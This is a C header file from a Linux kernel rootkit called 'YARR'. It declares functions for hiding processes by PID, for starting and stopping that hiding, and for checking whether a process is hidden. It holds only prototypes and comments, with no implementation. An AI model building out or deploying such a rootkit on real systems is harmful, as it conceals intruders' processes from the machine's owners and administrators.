/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_NINJA_TASKS
#define __YARR_NINJA_TASKS

#include <linux/types.h>

/***
 * Initializes everything related with hidding processes. This function must be
 * called BEFORE using any other function specified here. Elsewhere behaviour
 * is undefined... and undefined behaviour in the kernel means reboot please.
 */
void init_hideproc(void);

/***
 * Liberate resources taken during the living of yarr inside the kernel (just
 * hide process related). This function should be called just during yarr
 * unload.
 */
void exit_hideproc(void);

/***
 * Hides the process of PID <pid>.
 *
 * @pid: The PID of the process to be hidden.
 * @return: Zero on success or -1 if there were errors.
 */
int hideProc(pid_t pid);

/***
 * Stops hidding the process of PID <pid>.
 *
 * @pid: The PID of the process to stop hidding.
 * @return: Zero on success or -1 if there were errors.
 */
int stopHideProc(pid_t pid);

/***
 * Tells whether a process is being (should be) hide or not.
 *
 * @pid: The PID of the process to check for.
 * @return: Zero if the process is not being hidden or non-zero elsewhere.
 */
int isProcHidden(pid_t pid);

#endif /* __YARR_NINJA_TASKS */

